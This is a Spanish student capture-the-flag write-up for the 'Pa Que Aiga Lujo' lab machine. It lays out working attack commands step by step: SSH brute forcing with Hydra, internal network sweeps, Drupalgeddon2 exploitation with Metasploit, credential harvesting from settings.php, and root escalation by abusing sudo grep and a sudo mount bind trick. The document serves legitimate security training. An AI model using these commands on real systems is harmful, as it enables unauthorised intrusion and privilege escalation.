# Pa Que Aiga Lujo — The Hackers Labs

**Autor:** Carlos de la Cruz · ASIX 2
**Dificultad:** Alta · **Plataforma:** The Hackers Labs

> Resumen de la intrusión: diccionario de usuarios desde la web → fuerza bruta SSH → pivoting a red interna Docker → Drupalgeddon2 con Metasploit → credenciales en `settings.php` → escalada con `sudo grep` → contraseña del host → escalada final con `sudo mount`.

---

## 1. Reconocimiento y recolección de usuarios

Escaneamos la máquina objetivo (10.0.2.22) con Nmap y encontramos **22 (SSH)** y **80 (Apache)** abiertos.

```bash
nmap -sSVC -p- -Pn -n --min-rate 5000 -vvv 10.0.2.22
```

![Escaneo Nmap](images/01-nmap.png)

Accedemos al servicio web "Luxe Collection" y recolectamos nombres de los comentarios de clientes: **Carlos, Miguel, Isabella, Elena y Alexandre**, con los que construimos un diccionario de usuarios potenciales.

![Web Luxe Collection y comentarios](images/02-web-comentarios.png)

---

## 2. Fuerza bruta SSH

Con la lista de usuarios y `rockyou.txt`, atacamos SSH con **Hydra**.

```bash
hydra -L userluejo.txt -P /usr/share/wordlists/rockyou.txt -u -f -t 4 -V ssh://10.0.2.22
```

![Hydra y acceso SSH](images/03-hydra-ssh.png)

Entramos por SSH como la usuaria **Sophia**. Al revisar `/etc/passwd` confirmamos que también existen los usuarios `root`, `debian` y **`cipote`**.

![/etc/passwd con usuarios](images/04-passwd.png)

---

## 3. Descubrimiento de la red interna

Desde la consola de Sophia, lanzamos un bucle de ping para descubrir equipos en la red interna y detectamos dos hosts vivos: **172.17.0.1** y **172.17.0.2** (indicio de contenedores Docker).

```bash
for i in {1..254}; do (ping -c 1 172.17.0.$i | grep "bytes from" &); done
```

![Bucle de ping a la red interna](images/05-ping-fscan.png)

Subimos la herramienta **fscan** a `/tmp` desde nuestra máquina atacante y la usamos para escanear el host interno.

---

## 4. Explotación de Drupal (Drupalgeddon2)

El contenedor interno corre Drupal. Abrimos **msfconsole** y seleccionamos el exploit `drupal_drupalgeddon2`, dirigiéndolo a través de un túnel SSH (`RHOSTS localhost`, `RPORT 8080`).

```bash
msfconsole
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS localhost
set RPORT 8080
run
```

![Configuración del exploit en Metasploit](images/06-msf.png)

El objetivo es vulnerable y se abren **dos sesiones de Meterpreter** como `www-data` dentro del contenedor. Interactuamos con la primera (`sessions -i 1`) y confirmamos con `getuid` que somos `www-data`.

![Sesiones Meterpreter y getuid](images/07-meterpreter.png)

---

## 5. Credenciales en settings.php

Abrimos una shell del sistema y buscamos "password" en la configuración de Drupal. Localizamos la clave de la base de datos: **`ballenitafeliz`**.

```bash
grep -r "password" /var/www/html/sites/default/settings.php
```

Estabilizamos la terminal con `script -qc /bin/bash /dev/null` y cambiamos de usuario a **ballenita** con esa contraseña.

![settings.php y su ballenita](images/08-settings-ballenita.png)

---

## 6. Escalada dentro del contenedor (sudo grep)

`sudo -l` como `ballenita` revela que puede ejecutar **`/bin/ls` y `/bin/grep` como root** sin contraseña. Listamos `/root` con `sudo ls` y encontramos `secretitomaximo.txt`.

Como tenemos `grep` con privilegios, lo usamos para **leer el archivo secreto** (truco habitual: `grep` puede volcar el contenido de un fichero al que el usuario no tendría acceso):

```bash
sudo -u root /bin/grep '' /root/secretitomaximo.txt
```

Obtenemos la contraseña **`ElcipotedeChocolate-CipotitoCipoton`**, destinada al usuario del host principal.

![sudo -l, ls y grep del secreto](images/09-sudo-grep.png)

---

## 7. Pivot al host y escalada final (sudo mount)

Salimos del contenedor y entramos por SSH al **host principal** con el usuario `cipote` y la contraseña obtenida.

```bash
ssh cipote@10.0.2.22
```

![Acceso SSH como cipote y sudo -l](images/10-cipote.png)

`sudo -l` muestra que `cipote` puede ejecutar **`/usr/bin/mount` sin contraseña**. Abusamos de ello para sobrescribir `/bin/bash` mediante un *bind mount* y obtener una consola de root de inmediato:

```bash
sudo /usr/bin/mount -o bind /bin/bash /bin/mount
sudo mount
```

---

## 8. Las dos flags

Ya como root, nos movemos por el sistema con `ls` y leemos `user.txt` y `root.txt` con `cat` para capturar **ambas flags**.

![Flags de usuario y root](images/11-flags.png)

---

## Conclusión

Pa Que Aiga Lujo es la máquina más completa del conjunto: encadena recolección de usuarios, fuerza bruta, **pivoting** a una red interna de Docker, explotación de **Drupalgeddon2** con Metasploit, fuga de credenciales en `settings.php`, abuso de `sudo grep` para leer ficheros restringidos y, por último, escalada con `sudo mount`. Es un buen ejemplo de cómo varias configuraciones débiles encadenadas comprometen tanto un contenedor como el host que lo aloja.
